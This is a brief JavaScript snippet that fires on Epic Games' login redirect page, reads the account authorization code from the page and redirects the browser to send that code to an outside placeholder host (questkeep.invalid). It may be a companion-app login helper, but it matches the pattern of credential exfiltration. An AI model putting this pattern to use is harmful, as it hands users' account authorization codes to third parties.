(function () {
  if (!location.href.startsWith("https://www.epicgames.com/id/api/redirect")) return;
  function capture() {
    try {
      var data = JSON.parse(document.body.innerText);
      if (data && data.authorizationCode) {
        location.href = "https://questkeep.invalid/epic-auth?code=" + encodeURIComponent(data.authorizationCode);
      }
    } catch (e) {}
  }
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", capture);
  } else {
    capture();
  }
})();
